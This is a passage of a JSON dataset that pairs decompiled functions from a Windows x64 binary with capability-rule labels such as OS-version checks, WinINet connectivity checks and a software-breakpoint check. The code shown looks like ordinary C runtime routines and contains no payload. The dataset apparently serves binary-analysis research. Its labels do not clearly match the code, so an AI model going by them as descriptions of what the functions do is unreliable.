        "decompiled_code": "\nuint32_t fcn.140029368(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    uint32_t uVar3;\n    \n    uVar1 = fcn.140026a20();\n    uVar3 = uVar1 >> 3 & 0x10;\n    uVar2 = uVar3 | 8;\n    if ((uVar1 & 0x200) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 4;\n    if ((uVar1 & 0x400) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 2;\n    if ((uVar1 & 0x800) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 1;\n    if ((uVar1 & 0x1000) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 0x80000;\n    if ((uVar1 & 0x100) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar1 & 0x6000;\n    if (uVar3 != 0) {\n        if (uVar3 == 0x2000) {\n            uVar2 = uVar2 | 0x100;\n        }\n        else if (uVar3 == 0x4000) {\n            uVar2 = uVar2 | 0x200;\n        }\n        else if (uVar3 == 0x6000) {\n            uVar2 = uVar2 | 0x300;\n        }\n    }\n    uVar1 = uVar1 & 0x8040;\n    if (uVar1 == 0x40) {\n        uVar2 = uVar2 | 0x2000000;\n    }\n    else if (uVar1 == 0x8000) {\n        uVar2 = uVar2 | 0x3000000;\n    }\n    else if (uVar1 == 0x8040) {\n        uVar2 = uVar2 | 0x1000000;\n    }\n    uVar1 = ~(arg2 & 0x308031f) & uVar2 | arg1 & arg2 & 0x308031f;\n    if (uVar1 != uVar2) {\n        uVar3 = (uVar1 & 0x10) << 3;\n        uVar2 = uVar3 | 0x200;\n        if ((uVar1 & 8) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x400;\n        if ((uVar1 & 4) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x800;\n        if ((uVar1 & 2) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x1000;\n        if ((uVar1 & 1) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x100;\n        if ((uVar1 & 0x80000) == 0) {\n            uVar2 = uVar3;\n        }\n        arg1_00 = uVar2;\n        uVar3 = uVar1 & 0x300;\n        if (uVar3 != 0) {\n            if (uVar3 == 0x100) {\n                arg1_00 = uVar2 | 0x2000;\n            }\n            else if (uVar3 == 0x200) {\n                arg1_00 = uVar2 | 0x4000;\n            }\n            else if (uVar3 == 0x300) {\n                arg1_00 = uVar2 | 0x6000;\n            }\n        }\n        uVar1 = uVar1 & 0x3000000;\n        uVar2 = arg1_00;\n        if (uVar1 == 0x1000000) {\n            arg1_00 = uVar2 | 0x8040;\n        }\n        else if (uVar1 == 0x2000000) {\n            arg1_00 = uVar2 | 0x40;\n        }\n        else if (uVar1 == 0x3000000) {\n            arg1_00 = uVar2 | 0x8000;\n        }\n        if ((*0x14003ec18 == '\\0') || ((arg1_00 & 0x40) == 0)) {\n            arg1_00 = arg1_00 & 0xffffffbf;\n            fcn.140026a30(arg1_00);\n        }\n        else {\n            fcn.140026a30(arg1_00);\n        }\n        uVar1 = arg1_00 >> 3 & 0x10;\n        uVar2 = uVar1 | 8;\n        if ((arg1_00 & 0x200) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 4;\n        if ((arg1_00 & 0x400) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 2;\n        if ((arg1_00 & 0x800) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = uVar2 | 1;\n        if ((arg1_00 & 0x1000) == 0) {\n            uVar1 = uVar2;\n        }\n        uVar2 = uVar1 | 0x80000;\n        if ((arg1_00 & 0x100) == 0) {\n            uVar2 = uVar1;\n        }\n        uVar1 = arg1_00 & 0x6000;\n        if ((arg1_00 & 0x6000) != 0) {\n            if (uVar1 == 0x2000) {\n                uVar2 = uVar2 | 0x100;\n            }\n            else if (uVar1 == 0x4000) {\n                uVar2 = uVar2 | 0x200;\n            }\n            else if (uVar1 == 0x6000) {\n                uVar2 = uVar2 | 0x300;\n            }\n        }\n        uVar1 = arg1_00 & 0x8040;\n        if (uVar1 == 0x40) {\n            uVar2 = uVar2 | 0x2000000;\n        }\n        else if (uVar1 == 0x8000) {\n            uVar2 = uVar2 | 0x3000000;\n        }\n        else if (uVar1 == 0x8040) {\n            uVar2 = uVar2 | 0x1000000;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1604
    },
    "14000347": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003478(code **arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    \n    *arg1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    if ((arg1[0x10] != NULL) && (*arg1[3] == arg1 + 0xe)) {\n        pcVar1 = arg1[0x12];\n        pcVar2 = arg1[0x11];\n        *arg1[3] = pcVar2;\n        *arg1[7] = pcVar2;\n        uVar4 = pcVar1 - pcVar2;\n        arg2 = uVar4;\n        *arg1[10] = uVar4;\n    }\n    if (*(arg1 + 0x7c) != '\\0') {\n        if (arg1[0x10] != NULL) {\n            fcn.1400038dc(arg1, arg2);\n            fcn.14001080c(arg1[0x10]);\n        }\n        fcn.140003b54(arg1, 0, 2);\n    }\n    *arg1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    pcVar1 = arg1[0xc];\n    if (pcVar1 != NULL) {\n        if (*(pcVar1 + 8) != 0) {\n            iVar3 = (**0x14002b340)();\n            if (iVar3 != 0) {\n                (**0x14002b340)(iVar3, 1);\n            }\n        }\n        fcn.140005b7c(pcVar1);\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "1400104f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.1400104fc(ulong noname_0, ushort *arg2, uint64_t arg3, uint64_t arg4, int64_t noname_4, uint *noname_5, \n                     ulong arg_40h, ulong arg_48h, ulong arg_50h)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    int64_t aiStack88 [2];\n    ulong var_40h;\n    uchar auStack64 [8];\n    ulong var_30h;\n    uint64_t var_bp_28h;\n    uint32_t uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    aiStack88[0] = 0;\n    var_40h._0_1_ = 0;\n    var_bp_28h._0_1_ = '\\0';\n    stack0xffffffffffffffd4 = stack0xffffffffffffffd4 & 0xffffff00ffffffff;\n    uVar1 = stack0xffffffffffffffd4;\n    var_18h._0_1_ = '\\0';\n    if (noname_5 == NULL) {\n        uVar6 = *0x14003e3b8;\n        uVar7 = *0x14003e3bc;\n        uVar8 = *0x14003e3c0;\n        uVar9 = *0x14003e3c4;\n        if (*0x1400401e0 == 0) goto code_r0x000140010559;\n    }\n    else {\n        uVar6 = *noname_5;\n        uVar7 = noname_5[1];\n        uVar8 = noname_5[2];\n        uVar9 = noname_5[3];\ncode_r0x000140010559:\n        var_bp_28h._0_1_ = '\\x01';\n        _auStack64 = CONCAT412(uVar9, CONCAT48(uVar8, CONCAT44(uVar7, uVar6)));\n    }\n    if (noname_4 == 0) {\ncode_r0x00014001064e:\n        uStack40 = stack0xffffffffffffffd4 >> 0x20 | 1;\n        stack0xffffffffffffffd4 = CONCAT44(uStack40, 0x16);\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    else {\n        if (arg4 != 0) {\n            if (arg2 != NULL) goto code_r0x000140010593;\n            goto code_r0x00014001064e;\n        }\n        if (arg2 == NULL) {\n            unique0x10000258 = uVar1;\n            iVar2 = 0;\n            if (arg3 == 0) goto code_r0x00014001067a;\n            goto code_r0x00014001064e;\n        }\ncode_r0x000140010593:\n        if (arg3 == 0) goto code_r0x00014001064e;\n        iVar4 = -1;\n        if (arg3 <= arg4) {\n            iVar2 = fcn.14000c2f0(noname_0, arg2, arg3, noname_4);\n            arg2[arg3 - 1] = 0;\n            if (iVar2 != -2) goto code_r0x000140010613;\n            if (arg4 == 0xffffffffffffffff) {\n                iVar2 = iVar4;\n                if ((uStack40 != '\\0') && (stack0xffffffffffffffd4 == 0x22)) {\n                    unique0x10000268 = uVar1;\n                }\n                goto code_r0x00014001067a;\n            }\ncode_r0x000140010617:\n            *arg2 = 0;\n            bVar5 = iVar2 == -2;\n            iVar2 = iVar4;\n            if (bVar5) {\n                uStack40 = stack0xffffffffffffffd4 >> 0x20 & 0xffffff00 | 1;\n                stack0xffffffffffffffd4 = CONCAT44(uStack40, 0x22);\n                fcn.14000bf58(0, 0, 0, 0);\n            }\n            goto code_r0x00014001067a;\n        }\n        iVar2 = fcn.14000c2f0(noname_0, arg2, arg4 + 1, noname_4);\n        if (iVar2 != -2) {\ncode_r0x000140010613:\n            if (-1 < iVar2) goto code_r0x00014001067a;\n            goto code_r0x000140010617;\n        }\n        if ((uStack40 != '\\0') && (stack0xffffffffffffffd4 == 0x22)) {\n            unique0x10000288 = uVar1;\n        }\n    }\n    iVar2 = -1;\ncode_r0x00014001067a:\n    if (var_bp_28h == '\\x02') {\n        *(aiStack88[0] + 0x3a8) = *(aiStack88[0] + 0x3a8) & 0xfffffffd;\n    }\n    if (uStack40 != '\\0') {\n        iVar3 = fcn.14000bc38(aiStack88);\n        *(iVar3 + 0x20) = var_bp_28h._4_4_;\n    }\n    if (var_18h != '\\0') {\n        iVar3 = fcn.14000bc38(aiStack88);\n        *(iVar3 + 0x24) = uStack36;\n    }\n    return iVar2;\n}\n",
        "token_count": 1324
    },
    "14001094": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140010940(ulong noname_0, uint32_t *arg2, int32_t **arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    uchar auStackX16 [16];\n    uint32_t *puStackX32;\n    int64_t iStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t *piStack64;\n    int64_t *piStack56;\n    int32_t *piStack48;\n    int32_t *piStack40;\n    int32_t *piStack32;\n    \n    puStackX32 = arg4;\n    fcn.140011ea4(*arg2);\n    piVar1 = *0x14003fe00 + *0x14003fdf8;\n    for (piVar3 = *0x14003fe00; piStack64 = piVar3,  piVar3 != piVar1; piVar3 = piVar3 + 1) {\n        iStack88 = *piVar3;\n        if ((iStack88 != 0) && (uVar2 = *(iStack88 + 0x14),  (uVar2 >> 0xd & 1) != 0)) {\n            if ((((uVar2 & 3) == 2) && ((uVar2 & 0xc0) != 0)) || ((uVar2 >> 0xb & 1) != 0)) {\n                piStack32 = arg3[2];\n                piStack40 = arg3[1];\n                piStack48 = *arg3;\n                piStack56 = &iStack88;\n                iStack80 = iStack88;\n                iStack72 = iStack88;\n                fcn.1400108a4(auStackX16, &iStack72, &piStack56, &iStack80);\n            }\n            else {\n                **arg3 = **arg3 + 1;\n            }\n        }\n    }\n    fcn.140011ef8(*arg4);\n    return;\n}\n",
        "token_count": 465
    },
    "140010ac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.140010ac0(ulong *arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (((*(arg1 + 0x14) & 3) == 2) && ((*(arg1 + 0x14) & 0xc0) != 0)) {\n        uVar2 = *arg1 - *(arg1 + 1);\n        *(arg1 + 2) = 0;\n        arg2_00 = arg1[1];\n        *arg1 = arg2_00;\n        if (0 < uVar2) {\n            uVar1 = fcn.14001bbb4(arg1);\n            uVar1 = fcn.14001c8a4(uVar1, arg2_00, uVar2, arg2);\n            if (uVar2 != uVar1) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n                return 0xffffffff;\n            }\n            if ((*(arg1 + 0x14) >> 2 & 1) != 0) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 304
    },
    "14001139": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.14001139c(int64_t arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    \n    if ((arg1 == 0) || (2 < arg3)) {\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.14000c298(arg1);\n        uVar1 = fcn.140011514(arg1, arg2, arg3, arg4);\n        fcn.14000c2a4(arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "14001d61": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.14001d610(ulong arg1, int16_t *arg2, int64_t arg3)\n\n{\n    int16_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    ulong uVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int16_t *piVar10;\n    int16_t *piVar11;\n    int16_t *piVar12;\n    int64_t iVar13;\n    int64_t iVar14;\n    uint16_t auStackX8 [4];\n    uint64_t uStackX16;\n    int32_t aiStackX24 [4];\n    \n    uVar8 = arg1 & 0x3f;\n    iVar14 = arg1 >> 6;\n    iVar13 = 0;\n    iVar9 = *(iVar14 * 8 + 0x1400403d0);\n    uStackX16 = 4;\n    uVar5 = *(iVar9 + 0x28 + uVar8 * 0x48);\n    if ((arg3 == 0) || (*arg2 != 10)) {\n        puVar2 = iVar9 + 0x38 + uVar8 * 0x48;\n        *puVar2 = *puVar2 & 0xfb;\n    }\n    else {\n        puVar2 = iVar9 + 0x38 + uVar8 * 0x48;\n        *puVar2 = *puVar2 | 4;\n    }\n    piVar1 = arg2 + arg3;\n    piVar12 = arg2;\n    if (arg2 < piVar1) {\n        piVar10 = arg2;\n        do {\n            iVar6 = *piVar10;\n            if (iVar6 == 0x1a) {\n                iVar9 = *(iVar14 * 8 + 0x1400403d0);\n                uVar3 = *(iVar9 + 0x38 + uVar8 * 0x48);\n                if ((uVar3 & 0x40) != 0) {\n                    *piVar12 = 0x1a;\n                    goto code_r0x00014001d7cb;\n                }\n                *(iVar9 + 0x38 + uVar8 * 0x48) = uVar3 | 2;\n                break;\n            }\n            piVar11 = piVar10 + 1;\n            if (iVar6 == 0xd) {\n                if (piVar1 <= piVar11) {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar5, auStackX8, 2, aiStackX24, 0);\n                    if ((iVar7 == 0) || (aiStackX24[0] == 0)) {\ncode_r0x00014001d7a4:\n                        *piVar12 = 0xd;\n                        goto code_r0x00014001d7cb;\n                    }\n                    uVar8 = arg1 & 0x3f;\n                    if ((*(*(iVar14 * 8 + 0x1400403d0) + 0x38 + uVar8 * 0x48) & 0x48) == 0) {\n                        if ((auStackX8[0] != 10) || (piVar12 != arg2)) {\n                            fcn.14001e29c(arg1 & 0xffffffff, 0xfffffffffffffffe, 1);\n                            if (auStackX8[0] != 10) goto code_r0x00014001d7a4;\n                            break;\n                        }\n                    }\n                    else if (auStackX8[0] != 10) {\n                        *piVar12 = 0xd;\n                        uStackX16 = uStackX16 & 0xffffffffffff0000 | auStackX8[0];\n                        do {\n                            *(*(iVar14 * 8 + 0x1400403d0) + uVar8 * 0x48 + 0x3a + iVar13) = *(&uStackX16 + iVar13);\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 < 2);\n                        *(*(iVar14 * 8 + 0x1400403d0) + 0x3c + uVar8 * 0x48) = 10;\ncode_r0x00014001d7cb:\n                        piVar12 = piVar12 + 1;\n                        break;\n                    }\n                    *piVar12 = 10;\n                    goto code_r0x00014001d7cb;\n                }\n                iVar9 = 2;\n                if (*piVar11 == 10) {\n                    iVar9 = 4;\n                }\n                iVar4 = *piVar11;\n                piVar11 = piVar10 + iVar9;\n                iVar6 = 10;\n                if (iVar4 != 10) {\n                    iVar6 = 0xd;\n                }\n            }\n            *piVar12 = iVar6;\n            piVar12 = piVar12 + 1;\n            piVar10 = piVar11;\n        } while (piVar11 < piVar1);\n    }\n    return (piVar12 - arg2 >> 1) * 2;\n}\n",
        "token_count": 1157
    },
    "1400218f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400218f8(ulong arg1, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    uint64_t uVar8;\n    uint8_t *puVar9;\n    ushort *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uchar auStack104 [32];\n    int32_t iStack72;\n    uint8_t auStack66 [18];\n    uint64_t uStack48;\n    \n    uStack48 = *0x14003e020 ^ auStack104;\n    uVar3 = fcn.140021254(arg1);\n    uVar11 = 0;\n    if (uVar3 != 0) {\n        puVar5 = 0x14003eb20;\n        uVar13 = 1;\n        uVar8 = uVar11;\ncode_r0x000140021941:\n        if (*puVar5 != uVar3) goto code_r0x000140021949;\n        fcn.140008040(arg2 + 0x18, 0, 0x101);\n        puVar16 = 0x14003eb10;\n        iVar6 = 4;\n        puVar7 = uVar8 * 0x30 + 0x14003eb30;\n        do {\n            uVar2 = *puVar7;\n            puVar9 = puVar7;\n            while ((uVar2 != 0 && (puVar9[1] != 0))) {\n                uVar2 = *puVar9;\n                uVar15 = uVar2;\n                if (uVar2 <= puVar9[1]) {\n                    uVar14 = uVar2;\n                    do {\n                        uVar14 = uVar14 + 1;\n                        if (0x100 < uVar14) break;\n                        uVar15 = uVar15 + 1;\n                        puVar1 = uVar14 + 0x18 + arg2;\n                        *puVar1 = *puVar1 | *puVar16;\n                    } while (uVar15 <= puVar9[1]);\n                }\n                puVar9 = puVar9 + 2;\n                uVar2 = *puVar9;\n            }\n            puVar7 = puVar7 + 8;\n            puVar16 = puVar16 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        *(arg2 + 4) = uVar3;\n        *(arg2 + 8) = 1;\n        uVar12 = *0x140033b60;\n        if (((uVar3 != 0x3a4) && (uVar12 = *0x140033b68,  uVar3 != 0x3a8)) &&\n           ((uVar12 = *0x140033b70,  uVar3 != 0x3b5 && (uVar12 = uVar11,  uVar3 == 0x3b6)))) {\n            uVar12 = *0x140033b78;\n        }\n        *(arg2 + 0x220) = uVar12;\n        puVar10 = arg2 + 0xc;\n        iVar6 = 6;\n        do {\n            *puVar10 = *((uVar8 * 0x30 - arg2) + 0x14003eb18 + puVar10);\n            puVar10 = puVar10 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        goto code_r0x00014002199d;\n    }\ncode_r0x000140021b85:\n    fcn.1400212d4(arg2);\ncode_r0x000140021b8f:\n    fcn.140005b20(uStack48 ^ auStack104);\n    return;\ncode_r0x000140021949:\n    uVar15 = uVar8 + 1;\n    uVar8 = uVar15;\n    puVar5 = puVar5 + 0xc;\n    if (4 < uVar15) goto code_r0x000140021956;\n    goto code_r0x000140021941;\ncode_r0x000140021956:\n    if ((uVar3 == 65000) || (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(uVar3 & 0xffff),  iVar4 == 0))\n    goto code_r0x000140021b8f;\n    if (uVar3 == 0xfde9) {\n        *(arg2 + 4) = 0xfde9;\n        *(arg2 + 0x220) = 0;\n        *(arg2 + 0x18) = 0;\n        *(arg2 + 0x1c) = 0;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar3);\n        if (iVar4 == 0) {\n            if (*0x140040918 == 0) goto code_r0x000140021b8f;\n            goto code_r0x000140021b85;\n        }\n        fcn.140008040(arg2 + 0x18, 0, 0x101);\n        *(arg2 + 4) = uVar3;\n        *(arg2 + 0x220) = 0;\n        if (iStack72 == 2) {\n            puVar7 = auStack66;\n            while ((auStack66[0] != 0 && (puVar7[1] != 0))) {\n                uVar2 = *puVar7;\n                if (uVar2 <= puVar7[1]) {\n                    uVar3 = uVar2;\n                    uVar8 = (puVar7[1] - uVar2) + 1;\n                    do {\n                        uVar3 = uVar3 + 1;\n                        puVar16 = uVar3 + 0x18 + arg2;\n                        *puVar16 = *puVar16 | 4;\n                        uVar8 = uVar8 - 1;\n                    } while (uVar8 != 0);\n                }\n                puVar7 = puVar7 + 2;\n                auStack66[0] = *puVar7;\n            }\n            puVar7 = arg2 + 0x1a;\n            iVar6 = 0xfe;\n            do {\n                *puVar7 = *puVar7 | 8;\n                puVar7 = puVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            iVar4 = *(arg2 + 4);\n            uVar8 = *0x140033b60;\n            if ((((iVar4 != 0x3a4) && (uVar8 = *0x140033b68,  iVar4 != 0x3a8)) &&\n                (uVar8 = *0x140033b70,  iVar4 != 0x3b5)) && (uVar8 = *0x140033b78,  iVar4 != 0x3b6)) {\n                uVar8 = uVar11;\n            }\n            *(arg2 + 0x220) = uVar8;\n        }\n        else {\n            uVar13 = 0;\n        }\n        *(arg2 + 8) = uVar13;\n    }\n    puVar10 = arg2 + 0xc;\n    for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\ncode_r0x00014002199d:\n    fcn.14002136c(arg2);\n    goto code_r0x000140021b8f;\n}\n",
        "token_count": 1779
    },
    "140026e9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140026e94(ulong arg1, ulong arg2, ulong ***arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_00000040;\n    int32_t in_stack_00000048;\n    uchar auStack264 [32];\n    uchar *puStack232;\n    ulong ***pppuStack224;\n    ulong uStack216;\n    ulong ***pppuStack200;\n    ulong uStack192;\n    uchar auStack184 [48];\n    ulong uStack136;\n    uint32_t uStack120;\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e020 ^ auStack264;\n    uStack192 = fcn.14001fd68(0x1f80, 0xffc0);\n    pppuStack200 = arg3;\n    iVar2 = fcn.140026dd8(in_stack_00000028, uStack192);\n    uVar3 = in_stack_00000040;\n    uVar4 = in_stack_00000040 >> 0x20;\n    if (iVar2 == 0) {\n        if (in_stack_00000048 == 2) {\n            uStack136 = in_stack_00000040;\n            uStack120 = uStack120 & 0xffffffe3 | 3;\n        }\n        pppuStack224 = &pppuStack200;\n        puStack232 = &stack0x00000038;\n        fcn.14001f9b4(auStack184, &uStack192, in_stack_00000028);\n    }\n    cVar1 = fcn.140015fac();\n    if ((cVar1 == '\\0') || (arg4 == 0)) {\n        fcn.14001fd18(arg4);\n        fcn.14001fd68(uStack192, 0xffc0);\n    }\n    else {\n        uStack216 = uStack192;\n        pppuStack224 = pppuStack200;\n        puStack232 = CONCAT44(uVar4, uVar3);\n        fcn.140026d70(arg4, in_stack_00000030, arg1);\n    }\n    fcn.140005b20(uStack72 ^ auStack264);\n    return;\n}\n",
        "token_count": 528
    },
    "14002896": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140028968(uint64_t arg1, uint8_t *arg2, uint64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    uint8_t *puVar5;\n    uint8_t uVar6;\n    uint64_t uVar7;\n    uint32_t *arg1_00;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    ulong in_stack_00000028;\n    uchar auStack120 [24];\n    uint32_t auStack96 [6];\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e020 ^ auStack120;\n    arg1_00 = 0x140040930;\n    if (arg4 != NULL) {\n        arg1_00 = arg4;\n    }\n    puVar5 = 0x14003918b;\n    if (arg2 != NULL) {\n        puVar5 = arg2;\n    }\n    uVar9 = 1;\n    if (arg2 != NULL) {\n        uVar9 = arg3;\n    }\n    puVar8 = -(arg2 != NULL) & arg1;\n    if (uVar9 == 0) goto code_r0x000140028b25;\n    if (*(arg1_00 + 6) == 0) {\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n        if (-1 < uVar3) {\n            if (puVar8 != NULL) {\n                *puVar8 = uVar3;\n            }\n            goto code_r0x000140028b25;\n        }\n        if ((uVar3 & 0xe0) == 0xc0) {\n            uVar6 = 2;\n        }\n        else if ((uVar3 & 0xf0) == 0xe0) {\n            uVar6 = 3;\n        }\n        else {\n            if ((uVar3 & 0xf8) != 0xf0) goto code_r0x000140028b1a;\n            uVar6 = 4;\n        }\n        uVar2 = (1 << (7 - uVar6 & 0x1f)) - 1U & uVar3;\n        uVar3 = uVar6;\ncode_r0x000140028a70:\n        uVar4 = uVar3;\n        uVar7 = uVar3;\n        if (uVar9 <= uVar4) {\n            uVar7 = uVar9;\n        }\n        while (puVar5 - arg2 < uVar7) {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            if ((uVar1 & 0xc0) != 0x80) goto code_r0x000140028b1a;\n            uVar2 = uVar1 & 0x3f | uVar2 << 6;\n        }\n        if (uVar7 < uVar4) {\n            *(arg1_00 + 1) = uVar6;\n            *(arg1_00 + 6) = uVar3 - uVar7;\n            *arg1_00 = uVar2;\n            goto code_r0x000140028b25;\n        }\n        if ((0x7ff < uVar2 - 0xd800) && (uVar2 < 0x110000)) {\n            auStack96[2] = 0x80;\n            auStack96[3] = 0x800;\n            auStack96[4] = 0x10000;\n            if (auStack96[uVar6] <= uVar2) {\n                if (puVar8 != NULL) {\n                    *puVar8 = uVar2;\n                }\n                fcn.14002894c(-(uVar2 != 0) & uVar4, arg1_00);\n                goto code_r0x000140028b25;\n            }\n        }\n    }\n    else {\n        uVar6 = *(arg1_00 + 1);\n        uVar2 = *arg1_00;\n        uVar3 = *(arg1_00 + 6);\n        if (((uVar6 - 2 < 3) && (uVar3 != 0)) && (uVar3 < uVar6)) goto code_r0x000140028a70;\n    }\ncode_r0x000140028b1a:\n    fcn.140028954(arg1_00, in_stack_00000028);\ncode_r0x000140028b25:\n    fcn.140005b20(uStack72 ^ auStack120);\n    return;\n}\n",
        "token_count": 1037
    },
    "14000799": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
